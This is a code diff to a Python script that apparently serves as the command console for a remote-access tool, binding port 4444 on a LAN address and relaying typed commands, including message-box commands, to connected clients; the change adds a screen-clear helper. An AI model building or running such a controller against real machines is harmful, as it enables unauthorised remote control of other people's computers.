@@ -3,8 +3,11 @@ from os import system, name
 import sys
 import time
 
-ip = "127.0.0.1"
-port = 4444
+def clear():
+    if name == 'nt':
+        _ = system('cls')
+    else:
+        _ = system('clear')
 
 def send_full_message(client_socket, message):
     try:
@@ -67,6 +70,8 @@ def handle_client(client_socket, addr):
                 break
             elif cmd.lower().startswith("msgbox"):
                 send_full_message(client_socket, cmd)
+            elif cmd in ["clear", "cls"]:
+                clear()
             else:
                 send_full_message(client_socket, cmd)
 
@@ -78,6 +83,8 @@ def handle_client(client_socket, addr):
     print(f"Connection closed with {addr}\n")
 
 def main():
+    ip = "192.168.6.165"
+    port = 4444
 
     connection = socket(AF_INET, SOCK_STREAM)
     connection.bind((ip, port))
